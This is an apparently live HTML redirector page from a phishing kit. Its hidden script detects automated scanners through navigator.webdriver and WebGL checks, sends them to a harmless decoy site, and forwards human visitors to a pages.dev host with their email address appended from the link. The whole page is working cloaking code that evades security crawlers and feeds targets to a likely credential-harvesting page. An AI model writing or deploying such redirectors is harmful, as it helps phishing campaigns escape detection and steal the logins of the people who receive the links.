
<!DOCTYPE html>
<html style="display:none">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
<script>
// ULTRA-MINIMAL INVISIBLE ANTI-BOT
(function() {
    'use strict';
    
    // YOUR CONFIG
    const REAL_URL = "https://23b538b5.ko1wx90sd.pages.dev";
    const FAKE_URL = "https://example.com";
    
    // INSTANT BOT CHECK
    function isBot() {
        // Most reliable bot indicators
        if (navigator.webdriver === true) return true;
        if (window.__webdriver_evaluate !== undefined) return true;
        
        // Quick WebGL check
        try {
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
            if (!gl) return true;
        } catch(e) {
            return true;
        }
        
        return false;
    }
    
    // GET EMAIL
    function getEmail() {
        const params = new URLSearchParams(window.location.search);
        const email = params.get('email');
        return email ? '?email=' + encodeURIComponent(email.trim()) : '';
    }
    
    // EXECUTE
    setTimeout(function() {
        const bot = isBot();
        const email = getEmail();
        
        if (bot) {
            window.location.href = FAKE_URL;
        } else {
            window.location.href = REAL_URL + email;
        }
    }, 1); // 1ms delay - imperceptible
    
})();
</script>
